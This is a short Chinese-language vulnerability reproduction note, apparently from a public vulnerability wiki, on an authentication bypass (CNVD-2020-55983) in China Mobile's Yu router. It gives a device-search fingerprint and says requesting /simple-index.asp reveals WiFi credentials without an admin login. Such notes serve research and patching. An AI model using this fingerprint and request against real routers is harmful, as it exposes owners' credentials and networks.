---
title: "中国移动 禹路由 simple-index.asp 越权访问漏洞 CNVD-2020-55983"
date: 2026-10-18 09:15:41
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "中国移动"
tags:
  - "中国移动"
  - "信息泄露"
  - "越权"
  - "CNVD-2020-55983"
  - "漏洞复现"
---
## 漏洞描述

中国移动 禹路由 simple-index.asp 存在越权访问漏洞，攻击者通过漏洞可以获取账号密码等敏感信息

## 漏洞影响

```
中国移动 禹路由
```

## 网络测绘

```
title="互联世界 物联未来-登录"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162253135.png)



访问Url

```plain
/simple-index.asp
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162253346.png)

越过管理员验证获取Wifl账号密码等信息

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-CNVD-2020-55983.md)
